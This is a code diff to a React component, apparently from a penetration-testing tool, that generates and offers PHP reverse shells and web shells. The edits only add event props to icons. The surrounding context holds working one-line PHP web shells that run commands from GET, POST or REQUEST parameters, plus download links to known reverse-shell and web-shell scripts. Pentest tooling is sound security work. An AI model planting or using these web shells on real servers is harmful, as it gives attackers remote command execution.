@@ -209,7 +209,7 @@ export default function PhpReverseShell () {
                         <Col span={12}>
                             <Input
                                 maxLength={15}
-                                prefix={<WifiOutlined />}
+                                prefix={<WifiOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} />}
                                 name='Ip adress'
                                 placeholder='IP Address or domain (ex: 212.212.111.222)'
                                 onChange={handleChange( 'ip' )}
@@ -243,7 +243,7 @@ export default function PhpReverseShell () {
                             {pretty( phpReverseShell )}
                         </SyntaxHighlighter>
                         <Button href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" target='blank' type='dashed' style={{ marginBottom: 10, marginTop: 15 }}>
-                            <ArrowsAltOutlined style={{ marginRight: 10 }} />
+                            <ArrowsAltOutlined style={{ marginRight: 10 }} onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} />
                             Pentestmonkey's repository
                         </Button>
                     </Panel>
@@ -262,7 +262,7 @@ export default function PhpReverseShell () {
                         element.click();
                     }}
                 >
-                    <DownloadOutlined />
+                    <DownloadOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} />
                     Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={phpReverseShell}>
@@ -271,7 +271,7 @@ export default function PhpReverseShell () {
                         style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                         onClick={successInfoReverseShell}
                     >
-                        <CopyOutlined />
+                        <CopyOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} />
                         Copy
                     </Button>
                 </Clipboard>
@@ -302,7 +302,7 @@ export default function PhpReverseShell () {
                         element.click();
                     }}
                 >
-                    <DownloadOutlined />
+                    <DownloadOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} />
                     Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={oneLiner}>
@@ -311,7 +311,7 @@ export default function PhpReverseShell () {
                         style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
                         onClick={successInfoReverseShell}
                     >
-                        <CopyOutlined />
+                        <CopyOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} />
                         Copy
                     </Button>
                 </Clipboard>
@@ -337,10 +337,10 @@ export default function PhpReverseShell () {
                     </Panel>
                 </Collapse>
                 <Button href="https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php" target='blank' type='primary' style={{ marginBottom: 10, marginTop: 15 }}>
-                    <DownloadOutlined /> Download
+                    <DownloadOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} /> Download
                 </Button>
                 <Button href='https://github.com/flozz/p0wny-shell' target='blank' type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
-                    <ArrowsAltOutlined /> Flozz's repository
+                    <ArrowsAltOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} /> Flozz's repository
                 </Button>
             </div>
             <Divider orientation="center">Obfuscated PHP Web Shell</Divider>
@@ -366,11 +366,11 @@ export default function PhpReverseShell () {
                         element.click();
                     }}
                 >
-                    <DownloadOutlined /> Download
+                    <DownloadOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={'<?=`$_GET[0]`?>'}>
                     <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
-                        <CopyOutlined /> Copy
+                        <CopyOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} /> Copy
                     </Button>
                 </Clipboard>
             </div>
@@ -396,11 +396,11 @@ export default function PhpReverseShell () {
                         element.click();
                     }}
                 >
-                    <DownloadOutlined /> Download
+                    <DownloadOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={'<?=`$_POST[0]`?>'}>
                     <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
-                        <CopyOutlined /> Copy
+                        <CopyOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} /> Copy
                     </Button>
                 </Clipboard>
             </div>
@@ -428,11 +428,11 @@ export default function PhpReverseShell () {
                         element.click();
                     }}
                 >
-                    <DownloadOutlined /> Download
+                    <DownloadOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={"<?=`{$_REQUEST['_']}`?>"}>
                     <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
-                        <CopyOutlined /> Copy
+                        <CopyOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} /> Copy
                     </Button>
                 </Clipboard>
             </div >
@@ -459,11 +459,11 @@ export default function PhpReverseShell () {
                         element.click();
                     }}
                 >
-                    <DownloadOutlined /> Download
+                    <DownloadOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={shell_obfuscate}>
                     <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
-                        <CopyOutlined /> Copy
+                        <CopyOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} /> Copy
                     </Button>
                 </Clipboard>
             </div >
@@ -491,11 +491,11 @@ export default function PhpReverseShell () {
                         element.click();
                     }}
                 >
-                    <DownloadOutlined /> Download
+                    <DownloadOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={shell_obfuscate_function}>
                     <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
-                        <CopyOutlined /> Copy
+                        <CopyOutlined onPointerEnterCapture={undefined} onPointerLeaveCapture={undefined} /> Copy
                     </Button>
                 </Clipboard>
             </div >
